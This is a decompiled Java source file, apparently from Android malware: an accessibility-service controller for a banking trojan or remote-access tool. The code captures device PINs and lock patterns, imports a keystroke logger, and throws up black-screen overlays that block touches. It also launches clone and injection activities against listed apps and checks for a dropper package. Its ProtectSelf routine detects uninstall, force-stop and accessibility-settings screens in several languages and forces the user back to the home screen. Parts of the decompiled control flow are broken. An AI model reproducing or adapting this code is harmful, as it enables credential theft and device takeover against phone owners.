/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityGestureEvent
 *  android.accessibilityservice.AccessibilityService
 *  android.accessibilityservice.AccessibilityService$GestureResultCallback
 *  android.accessibilityservice.AccessibilityService$ScreenshotResult
 *  android.accessibilityservice.AccessibilityService$TakeScreenshotCallback
 *  android.accessibilityservice.AccessibilityServiceInfo
 *  android.accessibilityservice.GestureDescription
 *  android.accessibilityservice.GestureDescription$Builder
 *  android.accessibilityservice.GestureDescription$StrokeDescription
 *  android.app.KeyguardManager
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.res.Configuration
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.Canvas
 *  android.graphics.Color
 *  android.graphics.ColorFilter
 *  android.graphics.ColorMatrix
 *  android.graphics.ColorMatrixColorFilter
 *  android.graphics.ColorSpace
 *  android.graphics.Paint
 *  android.graphics.Path
 *  android.graphics.Point
 *  android.graphics.Rect
 *  android.graphics.Region
 *  android.graphics.Region$Op
 *  android.hardware.HardwareBuffer
 *  android.media.RingtoneManager
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.util.Base64
 *  android.util.DisplayMetrics
 *  android.util.Log
 *  android.view.KeyEvent
 *  android.view.MotionEvent
 *  android.view.View
 *  android.view.View$OnTouchListener
 *  android.view.ViewGroup$LayoutParams
 *  android.view.WindowManager
 *  android.view.WindowManager$LayoutParams
 *  android.view.accessibility.AccessibilityEvent
 *  android.view.accessibility.AccessibilityNodeInfo
 *  android.webkit.WebResourceRequest
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  android.widget.FrameLayout
 *  android.widget.FrameLayout$LayoutParams
 *  org.json.JSONArray
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.accessibilityservice.AccessibilityGestureEvent;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.ColorFilter;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.ColorSpace;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.Region;
import android.hardware.HardwareBuffer;
import android.media.RingtoneManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executor;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import linker.resourcer.encoder.ConfigManager;
import linker.resourcer.encoder.R;
import linker.resourcer.encoder.Tools;
import linker.resourcer.encoder.SplashActivity;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.InjectTargetActivity;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.KeystrokeLogger;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda10;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda11;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda14;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda15;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda16;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda17;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda18;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda19;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda20;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda21;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda22;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda23;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda24;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda25;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda26;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda3;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda4;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda5;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda6;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda7;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda8;
import linker.resourcer.encoder.AccessibilityServiceController$$ExternalSyntheticLambda9;
import linker.resourcer.encoder.AccessibilityServiceController$1$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda10;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda11;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda12;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda13;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda14;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda3;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda4;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda5;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda6;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda7;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda8;
import linker.resourcer.encoder.AccessibilityServiceController$10$$ExternalSyntheticLambda9;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.NotificationBuilder;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.SystemUtilities;
import linker.resourcer.encoder.SharedPreferencesManager;
import org.json.JSONArray;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class AccessibilityServiceController
extends AccessibilityService {
    public static boolean AUTO_INSTALL = false;
    public static WindowManager AccessWindow;
    public static WindowManager.LayoutParams Access_layParms;
    public static boolean Auto_Click = false;
    public static final int BLACK_OVERLAY_ALPHA = 232;
    public static boolean BlackScreen_BlockTouches = false;
    public static boolean BlackScreen_ON = false;
    public static WindowManager.LayoutParams Blacklayparams;
    public static boolean CapOK = false;
    public static boolean CapRead = false;
    private static Set<String> ClonedList;
    static HashMap<String, String> CommandsData;
    public static String CurrentLockState;
    public static String CurrentNam;
    public static boolean FOR_CHNG_STNG = false;
    public static volatile boolean FOR_DRAW_OVER = false;
    public static boolean FOR_Dream = false;
    public static volatile boolean FOR_EXTR_STRG = false;
    public static boolean FOR_NOTFY = false;
    public static boolean FOR_PLY = false;
    public static boolean FOR_PRIMS = false;
    public static AccessibilityNodeInfo Globalnode;
    public static Set<String> Graplist;
    public static String LastVisitedApp;
    public static boolean NeedEnter = false;
    private static int Notifi_ID = 0;
    private static final int PRE_DELAY_BEFORE_GESTURE_MS = 100;
    public static Set<String> Passlist;
    public static boolean PreventDelete;
    private static volatile long Protectdate;
    public static boolean SET_CALLS_DEF;
    public static boolean SET_SMS_DEF;
    private static volatile long Scannerdate;
    public static String TempStorepass;
    private static Map<Integer, Point> TemppatternMap;
    public static WindowManager.LayoutParams TouchBlockParams;
    private static PowerManager.WakeLock blackScreenWakeLock;
    public static boolean forbattery;
    private static String fullpatterncaptured;
    private static String fullpincaptured;
    private static volatile long grapperdate;
    public static String lastject;
    public static AccessibilityNodeInfo lastsrc;
    public static boolean lockedonce;
    private static String luncherpkg;
    private static int notifiid;
    public static volatile boolean oneExtstrg;
    public static boolean onealip;
    public static volatile boolean onebtry;
    public static volatile boolean onedefult;
    public static volatile boolean onedisply;
    public static volatile boolean oneinstall;
    public static volatile boolean onetimeDraw;
    public static volatile boolean onetimeNoty;
    public static FrameLayout onscreenview;
    public static int screenfontSize;
    public static int skipdoublicate;
    public static String skipject;
    public static boolean skiponecover;
    public static boolean skiprecord;
    private static AccessibilityService.TakeScreenshotCallback snapcallback;
    public FrameLayout BlackoverLay;
    private String DoublecatKey = "";
    private String LastAllowedApp = null;
    private String LastCapURL = "empty";
    private String LastCloneStart = "";
    private String LastOpenApp = "null";
    public View TouchBlockOverlay;
    private boolean Watcheron = false;
    boolean Watching = false;
    public WebView WbVwBlack;
    int conter = 0;
    boolean istouchwatch = false;
    private List<String> launcherApps;
    private boolean loadingclone = false;
    public int mHeight;
    public int mWidth;
    private int needclik = 0;
    private final Map<String, View> overlays;
    private boolean recordon = false;
    private BroadcastReceiver screenOffReceiver = null;
    private final ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(4, 8, 15L, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());

    static {
        screenfontSize = 30;
        LastVisitedApp = "N/A";
        Passlist = new HashSet<String>();
        ClonedList = new HashSet<String>();
        Graplist = new HashSet<String>();
        lastject = null;
        skipject = "";
        PreventDelete = false;
        onealip = false;
        skiponecover = false;
        Auto_Click = false;
        BlackScreen_ON = false;
        BlackScreen_BlockTouches = true;
        blackScreenWakeLock = null;
        skiprecord = false;
        NeedEnter = false;
        CapOK = false;
        CapRead = false;
        lockedonce = false;
        FOR_EXTR_STRG = false;
        forbattery = false;
        FOR_DRAW_OVER = false;
        onetimeDraw = false;
        onetimeNoty = false;
        oneExtstrg = false;
        onedisply = false;
        oneinstall = false;
        onebtry = false;
        onedefult = false;
        FOR_PLY = false;
        FOR_NOTFY = false;
        FOR_Dream = false;
        FOR_CHNG_STNG = false;
        FOR_PRIMS = false;
        AUTO_INSTALL = false;
        SET_SMS_DEF = false;
        SET_CALLS_DEF = false;
        Globalnode = null;
        lastsrc = null;
        Notifi_ID = 111;
        CommandsData = new HashMap();
        fullpincaptured = "";
        fullpatterncaptured = "";
        TemppatternMap = new HashMap<Integer, Point>();
        CurrentLockState = "";
        skipdoublicate = 0;
        TempStorepass = "";
        luncherpkg = "";
        notifiid = 1;
        grapperdate = 0L;
        Scannerdate = 0L;
        Protectdate = 0L;
    }

    public AccessibilityServiceController() {
        this.overlays = new HashMap<String, View>();
    }

    private void CloneChecker(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        new Thread(new Runnable(){
            final AccessibilityServiceController this$0;
            final AccessibilityServiceController val$accessor;
            {
                this.this$0 = jhvbzpdwpbqgticwdxuva2;
                this.val$accessor = jhvbzpdwpbqgticwdxuva3;
            }

            /*
             * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
             * Unable to fully structure code
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            @Override
            public void run() {
                var9_1 = false;
                var4_2 = 0;
                var1_3 = 5000;
                while (true) {
                    block34: {
                        block33: {
                            block41: {
                                block39: {
                                    block40: {
                                        block37: {
                                            block38: {
                                                block36: {
                                                    block35: {
                                                        var11_11 = var1_3;
                                                        try {
                                                            Thread.sleep(var11_11);
                                                            var10_10 = UtilityHelper.isPackageInstalled(ConfigurationProvider.Drop_name, this.val$accessor.getPackageManager());
                                                            if (!var10_10) {
                                                                var2_4 = var1_3;
                                                            }
                                                            ** GOTO lbl23
                                                        }
                                                        catch (Exception var13_21) {
                                                            var10_10 = var9_1;
                                                            break block33;
                                                        }
                                                        try {
                                                            AndroidLogger.Debug("Clonecheck", "No Dropper found !");
                                                            return;
                                                        }
                                                        catch (Exception var13_13) {
                                                            var1_3 = var2_4;
                                                            var10_10 = var9_1;
                                                        }
                                                        {
                                                            break block33;
lbl23:
                                                            // 1 sources

                                                            var15_24 = new Handler(this.val$accessor.getMainLooper());
                                                            var16_25 = this.val$accessor.getApplicationContext();
                                                            var10_10 = SharedPreferencesManager.ReadBool(var16_25, ConfigurationConstants.Clone_State, false);
                                                            if (var10_10) ** GOTO lbl-1000
                                                            var2_4 = var1_3;
                                                        }
                                                        {
                                                            if (!ConfigurationConstants.engine_done) {
                                                                var2_4 = var1_3;
                                                                AndroidLogger.Debug("Clonecheck", "Engine Waiting !");
                                                                continue;
                                                            }
                                                            if (var4_2 == 0) ** GOTO lbl59
                                                        }
                                                        try {
                                                            Thread.sleep(1000L);
                                                        }
                                                        catch (Exception var13_14) {
                                                            // empty catch block
                                                        }
                                                        var2_4 = var1_3;
                                                        {
                                                            AndroidLogger.Debug("Clonecheck", "Engine Try load ");
                                                            var2_4 = var1_3;
                                                            var2_4 = var1_3;
                                                            var13_12 = new Intent("App.ACT.LOAD");
                                                            var2_4 = var1_3;
                                                            var13_12.addCategory("android.intent.category.DEFAULT");
                                                            var2_4 = var1_3;
                                                            var13_12.addFlags(0x10000000);
                                                            var2_4 = var1_3;
                                                            var13_12.addFlags(65536);
                                                            var2_4 = var1_3;
                                                            var13_12.addFlags(32768);
                                                            var2_4 = var1_3;
                                                            this.val$accessor.startActivity((Intent)var13_12);
                                                            var1_3 = 7000;
                                                            continue;
lbl59:
                                                            // 1 sources

                                                            var2_4 = var1_3;
                                                            var2_4 = var1_3;
                                                            var13_12 = new Runnable(this){
                                                                final 9 this$1;
                                                                {
                                                                    this.this$1 = var1_1;
                                                                }

                                                                @Override
                                                                public void run() {
                                                                    Intent intent = new Intent("App.ACT.SETUP");
                                                                    intent.addCategory("android.intent.category.DEFAULT");
                                                                    intent.addFlags(0x10000000);
                                                                    intent.addFlags(65536);
                                                                    intent.addFlags(32768);
                                                                    this.this$1.val$accessor.startActivity(intent);
                                                                }
                                                            };
                                                            var2_4 = var1_3;
                                                            var15_24.post(var13_12);
                                                            var2_4 = var1_3 = 30000;
                                                            AndroidLogger.Debug("Clonecheck", "Engine installing ");
                                                            var5_6 = 1;
                                                            var2_4 = var1_3;
                                                            var10_10 = var9_1;
                                                            break block34;
                                                        }
lbl-1000:
                                                        // 1 sources

                                                        {
                                                            AndroidLogger.Debug("Clonecheck", "Engine Ready !");
                                                            var5_6 = 0;
                                                            var7_8 = 0;
                                                            var2_4 = 0;
                                                            var6_7 = 0;
                                                            var8_9 = 0;
                                                            var10_10 = var9_1;
                                                        }
                                                        try {
                                                            var13_12 = SharedPreferencesManager.Read(var16_25, ConfigurationConstants.Clone_Apps, "");
                                                            var10_10 = var9_1;
                                                            if (var13_12.length() <= 0) break block35;
                                                            var10_10 = var9_1;
                                                            var10_10 = var9_1;
                                                            var14_22 = new JSONArray((String)var13_12);
                                                            var10_10 = var9_1;
                                                            var10_10 = var9_1;
                                                            var13_12 = new HashSet();
                                                            var3_5 = 0;
                                                            while (true) lbl-1000:
                                                            // 2 sources

                                                            {
                                                                var10_10 = var9_1;
                                                                if (var3_5 >= var14_22.length()) break;
                                                                var10_10 = var9_1;
                                                                var17_26 = var14_22.getJSONObject(var3_5).getString("p");
                                                                var2_4 = var7_8;
                                                                break;
                                                            }
                                                        }
                                                        catch (Exception var13_18) {
                                                            var9_1 = var10_10;
                                                            var2_4 = var6_7;
                                                            break block36;
                                                        }
                                                        {
                                                            try {
                                                                var13_12.add(var17_26);
                                                                ++var3_5;
                                                                continue;
                                                            }
                                                            catch (Exception var13_17) {
                                                                break block36;
                                                            }
                                                            ** while (true)
                                                        }
                                                        var10_10 = var9_1;
                                                        var2_4 = var7_8;
                                                        {
                                                            if (var13_12.containsAll(AccessibilityServiceController.Passlist)) {
                                                                var2_4 = var7_8;
                                                                Log.d((String)"Clonecheck", (String)"\u2705 All passlist entries are present!");
                                                                var2_4 = var7_8;
                                                                AccessibilityServiceController.access$502(AccessibilityServiceController.Passlist);
                                                                var2_4 = var8_9;
                                                                break block37;
                                                            }
                                                            var6_7 = 1;
                                                            var3_5 = 1;
                                                            var2_4 = var6_7;
                                                            Log.d((String)"Clonecheck", (String)"\u274c Some entries are missing.");
                                                            var2_4 = var6_7;
                                                            var2_4 = var6_7;
                                                            var17_26 = new HashSet(AccessibilityServiceController.Passlist);
                                                            var2_4 = var6_7;
                                                            var17_26.removeAll((Collection<?>)var13_12);
                                                            var2_4 = var6_7;
                                                            var2_4 = var6_7;
                                                            var14_22 = new StringBuilder();
                                                            var2_4 = var6_7;
                                                            Log.d((String)"Clonecheck", (String)var14_22.append("Missing: ").append(var17_26).toString());
                                                            var14_22 = var13_12;
                                                        }
                                                        try {
                                                            var17_26 = var17_26.iterator();
                                                            break block38;
                                                        }
                                                        catch (Exception var13_16) {
                                                            var2_4 = var3_5;
                                                            break block37;
                                                        }
                                                    }
                                                    var3_5 = 1;
                                                    break block40;
                                                }
                                                var10_10 = var9_1;
                                                try {
                                                    var13_12.printStackTrace();
                                                    var5_6 = 1;
                                                    var3_5 = var2_4;
                                                    break block39;
                                                }
                                                catch (Exception var13_20) {
                                                    break block33;
                                                }
                                            }
                                            while (true) {
                                                var14_22 = var13_12;
                                                if (!var17_26.hasNext()) break;
                                                var14_22 = var13_12;
                                                var18_27 = (String)var17_26.next();
                                                var14_22 = var13_12;
                                                try {
                                                    var14_22 = new Runnable(){
                                                        final 9 this$1;
                                                        final String val$missingid;
                                                        {
                                                            this.this$1 = var1_1;
                                                            this.val$missingid = string2;
                                                        }

                                                        @Override
                                                        public void run() {
                                                            Intent intent = new Intent("App.ACT.CLONE");
                                                            intent.putExtra("extra_message", this.val$missingid);
                                                            intent.addCategory("android.intent.category.DEFAULT");
                                                            intent.addFlags(0x10000000);
                                                            intent.addFlags(65536);
                                                            intent.addFlags(32768);
                                                            this.this$1.val$accessor.startActivity(intent);
                                                        }
                                                    };
                                                    var15_24.post((Runnable)var14_22);
                                                }
                                                catch (Exception var13_15) {
                                                    var2_4 = var3_5;
                                                    break block37;
                                                }
                                                try {
                                                    if (!UtilityHelper.isSystemApp(var16_25, var18_27)) {
                                                        AccessibilityServiceController.AUTO_INSTALL = true;
                                                    }
                                                    Thread.sleep(10000L);
                                                }
                                                catch (Exception var14_23) {}
                                            }
                                            var2_4 = var3_5;
                                        }
                                        var9_1 = var10_10;
                                        var3_5 = var5_6;
                                    }
                                    var5_6 = var3_5;
                                    var3_5 = var2_4;
                                }
                                if (var5_6 != 0) break block41;
                                var2_4 = var1_3;
                                var5_6 = var4_2;
                                var10_10 = var9_1;
                                if (var3_5 == 0) break block34;
                            }
                            try {
                                Thread.sleep(1000L);
                            }
                            catch (Exception var13_19) {
                                // empty catch block
                            }
                            var10_10 = var9_1;
                            {
                                AndroidLogger.Debug("Clonecheck", "Engine Try load ");
                                var10_10 = var9_1;
                                var10_10 = var9_1;
                                var13_12 = new Intent("App.ACT.LOAD");
                                var10_10 = var9_1;
                                var13_12.addCategory("android.intent.category.DEFAULT");
                                var10_10 = var9_1;
                                var13_12.addFlags(0x10000000);
                                var10_10 = var9_1;
                                var13_12.addFlags(65536);
                                var10_10 = var9_1;
                                var13_12.addFlags(32768);
                                var10_10 = var9_1;
                                this.val$accessor.startActivity((Intent)var13_12);
                                var1_3 = 7000;
                                continue;
                            }
                        }
                        AndroidLogger.Error("Clonecheck", var13_12.getMessage());
                        var13_12.printStackTrace();
                        var5_6 = var4_2;
                        var2_4 = var1_3;
                    }
                    var9_1 = var10_10;
                    var1_3 = var2_4;
                    var4_2 = var5_6;
                }
            }
        }).start();
    }

    /*
     * Unable to fully structure code
     */
    private void ProtectSelf(String var1_1, String var2_3, String var3_5) {
        block59: {
            block48: {
                block58: {
                    block56: {
                        block57: {
                            block55: {
                                block53: {
                                    block54: {
                                        block51: {
                                            block52: {
                                                block49: {
                                                    block50: {
                                                        block47: {
                                                            block46: {
                                                                block45: {
                                                                    block44: {
                                                                        block43: {
                                                                            block42: {
                                                                                var1_1 = var1_1.toLowerCase();
                                                                                var13_6 = var2_3.toLowerCase();
                                                                                var12_7 = var1_1.contains(AccessibilityServiceController.CurrentNam);
                                                                                var11_8 = var1_1.contains("\u200c\u200c\u200c");
                                                                                var4_9 = var12_7 | var11_8;
                                                                                if (!var4_9) ** GOTO lbl14
                                                                                if (var1_1.contains("uninstall") || var1_1.contains("stop") || var1_1.contains("accessibility")) {
                                                                                    UtilityHelper.hideme((Context)this);
                                                                                    AccessibilityServiceHelper.blockBack();
                                                                                    AccessibilityServiceHelper.GoHome();
                                                                                    return;
                                                                                }
lbl14:
                                                                                // 3 sources

                                                                                if (!var13_6.contains("com.google.android.packageinstaller") && !var13_6.contains("com.android.packageinstaller") && !var13_6.contains("com.miui.packageinstaller") && !var13_6.contains("packageinstaller") || !var4_9) ** GOTO lbl20
                                                                                UtilityHelper.hideme((Context)this);
                                                                                AccessibilityServiceHelper.blockBack();
                                                                                AccessibilityServiceHelper.GoHome();
                                                                                return;
lbl20:
                                                                                // 1 sources

                                                                                var11_8 = var13_6.equals("com.android.settings");
                                                                                if (var11_8) ** GOTO lbl24
                                                                                if (!var13_6.equals("com.samsung.android.settings")) ** GOTO lbl30
lbl24:
                                                                                // 2 sources

                                                                                if (!var3_5.contains("accessibilitysettings") && !var3_5.contains("installedappdetails") && !var3_5.contains("appinfodashboard") && !var3_5.contains("uninstalleractivit") || !var4_9) ** GOTO lbl30
                                                                                UtilityHelper.hideme((Context)this);
                                                                                AccessibilityServiceHelper.blockBack();
                                                                                AccessibilityServiceHelper.GoHome();
                                                                                return;
lbl30:
                                                                                // 2 sources

                                                                                if (!var13_6.equals("com.samsung.accessibility") && !var13_6.equals("com.samsung.android.accessibility") || !var4_9) break block42;
                                                                                UtilityHelper.hideme((Context)this);
                                                                                AccessibilityServiceHelper.blockBack();
                                                                                AccessibilityServiceHelper.GoHome();
                                                                                return;
                                                                            }
                                                                            if (var3_5 == null) ** GOTO lbl45
                                                                            if (var2_3.length() <= 0 || !var3_5.equals("android.support.v7.widget.recyclerview") && !var3_5.equals("androidx.recyclerview.widget.recyclerview") && !var3_5.equals("android.widget.linearlayout") && !var3_5.equals("android.widget.framelayout") && !var3_5.equals("android.widget.scrollview") && !var3_5.contains("recyclerview") || !var2_3.equals("com.android.settings") && !var2_3.equals("com.samsung.android.settings") && !var2_3.equals("com.miui.securitycenter") || !var4_9) ** GOTO lbl45
                                                                            UtilityHelper.hideme((Context)this);
                                                                            AccessibilityServiceHelper.blockBack();
                                                                            AccessibilityServiceHelper.GoHome();
                                                                            return;
lbl45:
                                                                            // 2 sources

                                                                            if (var11_8 = var13_6.contains("launcher")) break block43;
                                                                            if (!var13_6.equals("com.google.android.apps.nexuslauncher") && !var13_6.equals("com.sec.android.app.launcher")) break block44;
                                                                        }
                                                                        if (var4_9) {
                                                                            if (!var1_1.contains("uninstall") && !var1_1.contains("\u0443\u0434\u0430\u043b\u0438\u0442\u044c") && !var1_1.contains("remove") && !var1_1.contains("kald\u0131r") && !var1_1.contains("\u5378\u8f7d") && !var1_1.contains("desinstalar")) break block44;
                                                                            UtilityHelper.hideme((Context)this);
                                                                            AccessibilityServiceHelper.blockBack();
                                                                            AccessibilityServiceHelper.GoHome();
                                                                            return;
                                                                        }
                                                                    }
                                                                    if (var4_9) {
                                                                        if (!var13_6.contains("settings") && !var13_6.contains("security") || !var1_1.contains("\u0625\u064a\u0642\u0627\u0641") && !var1_1.contains("stop") && !var1_1.contains("\u062a\u0648\u0642\u0641") && !var1_1.contains("delete") && !(var11_8 = var1_1.contains("\u0627\u0644\u0625\u064a\u0642\u0627\u0641"))) break block45;
                                                                        try {
                                                                            AccessibilityServiceHelper.blockBack();
                                                                            AccessibilityServiceHelper.GoHome();
                                                                            return;
                                                                        }
                                                                        catch (Exception var2_4) {
                                                                            // empty catch block
                                                                        }
                                                                    }
                                                                }
                                                                if (var4_9) {
                                                                    if (!var1_1.contains("accessibility") || !var13_6.contains("settings")) break block46;
                                                                    AccessibilityServiceHelper.blockBack();
                                                                    AccessibilityServiceHelper.GoHome();
                                                                    return;
                                                                }
                                                            }
                                                            if (var4_9) {
                                                                if (!var13_6.equals("com.vivo.permissionmanager") && !var13_6.equals("com.oplus.securitypermission") && !var13_6.equals("com.coloros.oppoguardelf")) break block47;
                                                                UtilityHelper.hideme((Context)this);
                                                                AccessibilityServiceHelper.blockBack();
                                                                AccessibilityServiceHelper.GoHome();
                                                                return;
                                                            }
                                                        }
                                                        if (!var4_9) {
                                                            return;
                                                        }
                                                        var5_10 = false;
                                                        var2_3 = Locale.getDefault().getLanguage();
                                                        var3_5 = var13_6.toLowerCase();
                                                        if (var3_5.contains("battery") || var3_5.contains("settings") || var3_5.contains("installer") || var3_5.contains("com.miui") || var3_5.contains("com.samsung") || var3_5.contains("com.coloros") || var3_5.contains("com.oppo") || var3_5.contains("com.oneplus") || var3_5.contains("com.infinix") || var3_5.contains("com.realme") || var3_5.contains("com.android.vending") || var3_5.contains("com.oplus") || var3_5.contains("com.iqoo") || var3_5.contains("com.vivo") || var3_5.contains("com.huawei")) ** GOTO lbl92
                                                        var4_9 = var5_10;
                                                        if (!var3_5.contains("security")) break block48;
lbl92:
                                                        // 2 sources

                                                        var11_8 = var2_3.equals("ar");
                                                        var7_11 = false;
                                                        var10_12 = false;
                                                        var4_9 = false;
                                                        var9_13 = false;
                                                        var6_14 = false;
                                                        var8_15 = false;
                                                        if (!var11_8) break block49;
                                                        if (var1_1.contains("\u062d\u0630\u0641") || var1_1.contains("\u0645\u0633\u062d")) break block50;
                                                        var4_9 = var8_15;
                                                        if (!var1_1.contains("\u0625\u0644\u063a\u0627\u0621")) break block48;
                                                    }
                                                    var4_9 = true;
                                                    {
                                                        break block48;
                                                    }
                                                }
                                                if (!var2_3.equals("en")) break block51;
                                                if (var1_1.contains("clear data") || var1_1.contains("uninstall")) break block52;
                                                var4_9 = var7_11;
                                                if (!var1_1.contains("turn off")) break block48;
                                            }
                                            var4_9 = true;
                                            {
                                                break block48;
                                            }
                                        }
                                        if (!var2_3.equals("tr")) break block53;
                                        if (var1_1.contains("sil") || var1_1.contains("kald\u0131r") || var1_1.contains("silmek")) break block54;
                                        var4_9 = var10_12;
                                        if (!var1_1.contains("zorla")) break block48;
                                    }
                                    var4_9 = true;
                                    {
                                        break block48;
                                    }
                                }
                                if (!var2_3.equals("zh")) break block55;
                                if (var1_1.contains("\u5378\u8f7d") || var1_1.contains("\u5f3a\u884c\u505c\u6b62") || var1_1.contains("\u5220\u9664") || var1_1.contains("\u89e3\u9664\u5b89\u88c5") || var1_1.contains("\u786e\u8ba4\u5378\u8f7d") || var1_1.contains("\u786e\u5b9a\u5220\u9664") || var1_1.contains("\u5173\u95ed")) {
                                    var4_9 = true;
                                }
                                break block48;
                            }
                            if (!var2_3.equals("es")) break block56;
                            if (var1_1.contains("borrar") || var1_1.contains("eliminar") || var1_1.contains("desinstalar")) break block57;
                            var4_9 = var9_13;
                            if (!var1_1.contains("desactivar")) break block48;
                        }
                        var4_9 = true;
                        {
                            break block48;
                        }
                    }
                    var4_9 = var5_10;
                    if (!var2_3.equals("pt")) break block48;
                    if (var1_1.contains("apagar") || var1_1.contains("limpiar datos") || var1_1.contains("excluir") || var1_1.contains("remover") || var1_1.contains("desativar")) break block58;
                    var4_9 = var6_14;
                    if (!var1_1.contains("limpar dados")) break block48;
                }
                var4_9 = true;
            }
            if (!var3_5.contains("com.huawei.android.chr") && !var4_9) break block59;
            try {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }
            catch (Exception var1_2) {
                // empty catch block
            }
        }
    }

    private void Setup() {
        WindowManager windowManager;
        Object object;
        Object object2;
        try {
            if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), SetupOrchestrationService.class)) {
                object2 = new Intent(this.getApplicationContext(), SetupOrchestrationService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService((Intent)object2);
                } else {
                    this.startService((Intent)object2);
                }
            }
            AndroidLogger.Debug("luncherid:", this.currentlancher(this.getApplicationContext()));
            this.enableaccess();
